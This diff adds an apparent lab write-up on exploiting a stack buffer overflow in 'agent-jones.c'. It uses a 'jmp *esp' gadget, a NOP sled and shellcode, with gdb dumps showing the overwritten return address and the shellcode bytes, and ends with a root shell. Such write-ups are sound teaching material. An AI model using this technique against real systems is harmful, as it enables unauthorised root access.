@@ -1,0 +1,51 @@
+In this problem, the vulnerability we are trying to exploit involves filling our buffer to take advantage of hardcoded data as instructions. As described in the ASLR document, our plan is to place our shell code in the location ESP will point to at the end of a function call as well as to overwrite the instruction pointer to point to a “jump *esp” instruction, leading to the execution of the shell code.
+
+We began by searching through the assembly code of each function in agent-jones.c and found the hex sequence for “jump *esp” in the magic() function.
+
+(gdb) disas magic
+Dump of assembler code for function magic:
+   0x08048604 <+0>:	push   %ebp
+   ...
+   0x08048619 <+21>:	orl    $0xe4ff,0x8(%ebp)
+(gdb) x/i 0x0804861c
+   0x804861c <magic+24>:	jmp    *%esp
+
+Note: Since the instruction “orl” would take up 3 bytes, we offset the address by 3 to obtain the “jump *esp” instruction address.
+
+Now, we began our debugger, set a breakpoint at line 33 (inside the handle() function), and noted the addresses of the ESP and EBP. The EBP is important, as it will return back to this value at the end of the io() function call.
+
+(gdb) p $esp
+$1 = (void *) 0xbffff4f0
+(gdb) p $ebp
+$2 = (void *) 0xbffffc08 
+
+Next, we set a break at line 30 (inside io()), where our buffer address is 0xbffff4f8. Since we know that the ESP will be set to the value of EBP upon a function’s return call, we chose to set the value of the RIP found after handle()s EBP (RIP = 0xbffffc0c) to the address of the “jmp *esp” instruction. In addition, since the “jmp *esp” command will start running the command found right after the return address, we chose to place the shell code right after the return address command (at 0xbffffc10). We accordingly added 1800 bytes of NOP instructions to account for the space between the buffer address and handle’s EBP.
+
+At line 28 (before the buffer is filled), the buffer looks like:
+
+(gdb) x/500x buf
+0xbffff500:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff510:	0x00000000	0x00000000	0x00000000	0x00000000
+...		...		...		...		...
+0xbffffc00:	0xb7fd2000	0x00000000	0xbffffc68	0x080488cc
+0xbffffc10:	0x00000008	0xbffffc34	0xbffffc30	0xbffffc54
+
+On the other hand, at line 32 (after the buffer has been filled):
+
+(gdb) x/500x buf
+0xbffff500:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff510:	0x90909090	0x90909090	0x90909090	0x90909090
+...		...		...		...		...
+0xbffffc00:	0x90909090	0x90909090	0x0804861c	0x0804861c
+0xbffffc10:	0xe3f7db31	0x6a534353	0xb0e18902	0x5b80cd66
+
+Thus, when the code tries to exit the handle() function,  the “jmp *esp” command will be called, resulting in the shell code being run and us getting the final output.
+
+jones@pwnable:~$ invoke exploit
+sending exploit...
+connecting to 0wned machine...
+whoami
+root
+
+
+
